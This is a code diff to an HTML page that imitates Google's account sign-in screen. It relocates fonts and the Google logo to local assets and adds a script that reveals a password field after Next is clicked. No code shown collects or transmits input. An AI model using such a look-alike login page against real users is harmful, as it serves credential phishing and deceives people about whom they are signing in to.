@@ -11,28 +11,28 @@
       font-style: normal;
       font-weight: 300;
       src: local('Roboto Light'),
-        url('./fonts/Roboto/Roboto-Light.ttf') format('truetype');
+        url('./assets/fonts/Roboto/Roboto-Light.ttf') format('truetype');
     }
     @font-face {
       font-family: 'Roboto';
       font-style: normal;
       font-weight: 400;
       src: local('Roboto Regular'),
-        url('./fonts/Roboto/Roboto-Regular.ttf') format('truetype');
+        url('./assets/fonts/Roboto/Roboto-Regular.ttf') format('truetype');
     }
     @font-face {
       font-family: 'Roboto';
       font-style: normal;
       font-weight: 500;
       src: local('Roboto Medium'),
-        url('./fonts/Roboto/Roboto-Medium.ttf') format('truetype');
+        url('./assets/fonts/Roboto/Roboto-Medium.ttf') format('truetype');
     }
     @font-face {
       font-family: 'Roboto';
       font-style: normal;
       font-weight: 700;
       src: local('Roboto Bold'),
-        url('./fonts/Roboto/Roboto-Bold.ttf') format('truetype');
+        url('./assets/fonts/Roboto/Roboto-Bold.ttf') format('truetype');
     }
     * {
       margin: 0%;
@@ -73,7 +73,7 @@
     .heading {
       margin-bottom: 30px;
     }
-    input[type="email"] {
+    input[type="email"], input[type="password"] {
       display: block;
       border: 1px solid rgb(228, 228, 228);
       font-size: 16px;
@@ -102,14 +102,14 @@
       background-color: white;
       padding: 0 5px;
     }
-    input[type="email"]:focus~.input-label {
+    input[type="email"]:focus~.input-label, input[type="password"]:focus~.input-label {
       top: -7px;
       color: #1864c9;
       font-size: 13px;
       background-color: rgb(255, 255, 255);
       z-index: 2;
     }
-    input[type="email"]:target~.input-label {
+    input[type="email"]:target~.input-label, input[type="password"]:target~.input-label {
       top: -7px;
       color: #1864c9;
       font-size: 13px;
@@ -162,7 +162,7 @@
 <body>
   <div class="container">
     <div class="top-content">
-      <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
+      <img src="assets/logo.png" alt="">
       <h2>Sign in</h2>
       <p class="heading">Use your Google Account</p>
 
@@ -177,10 +177,44 @@
     <a href="" class="link-btn">Learn More</a>
     <div class="btn-group">
       <button class="create-btn">Create account</button>
-      <button class="next-btn">Next</button>
+      <button class="next-btn" onclick="showPasswordField()">Next</button>
 
     </div>
   </div>
+
+  <script>
+    function showPasswordField() {
+      const inputsDiv = document.querySelector('.inputs');
+      
+      // Check if password field already exists
+      if (document.getElementById('password')) {
+        return;
+      }
+      
+      // Create password input wrapper div
+      const passwordWrapper = document.createElement('div');
+      passwordWrapper.style.position = 'relative';
+      passwordWrapper.style.marginTop = '10px';
+      
+      // Create password input
+      const passwordInput = document.createElement('input');
+      passwordInput.type = 'password';
+      passwordInput.id = 'password';
+      passwordInput.name = 'password';
+      passwordInput.className = 'input';
+      
+      // Create password label
+      const passwordLabel = document.createElement('label');
+      passwordLabel.htmlFor = 'password';
+      passwordLabel.className = 'input-label';
+      passwordLabel.textContent = 'Enter your password';
+      
+      // Append elements
+      passwordWrapper.appendChild(passwordInput);
+      passwordWrapper.appendChild(passwordLabel);
+      inputsDiv.appendChild(passwordWrapper);
+    }
+  </script>
 </body>
 
 </html>
